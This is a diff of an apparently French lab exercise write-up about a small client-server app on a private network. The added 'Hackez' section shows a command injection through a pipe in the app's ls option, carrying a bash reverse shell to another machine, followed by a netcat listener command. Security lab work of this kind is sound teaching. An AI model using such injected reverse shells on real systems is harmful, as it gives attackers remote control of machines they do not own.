@@ -83,6 +83,7 @@ Server started. Listening on ('192.168.56.101', 8888)...
 tcp   LISTEN 0      100    192.168.56.114:8888      0.0.0.0:*
 ```
 2. Prêts
+   
 🌞 Se connecter à l'application depuis votre PC
 
 ```
@@ -96,9 +97,19 @@ Hello ! Tu veux des infos sur quoi ?
 Ton choix (1, 2, 3 ou 4) :
 ```
 
+3. Hackez
 
+🌞 Euh bah... hackez l'application !
 
+Du côté client, on constate qu'en sélectionnant l'option 4, il est possible de choisir un dossier à lister avec la commande ls, puis d'injecter une commande via un pipe. Ainsi, nous injectons un reverse shell en bash et configurons un serveur d'écoute sur une autre machine
 
+```
+   Ton choix (1, 2, 3 ou 4) : 4
+Exécuter la commande ls vers le dossier : /etc | sh -i >& /dev/udp/192.168.56.115/4242 0>&1
+```
+```
+nc -u -lvp -4242
+```
 
 
 
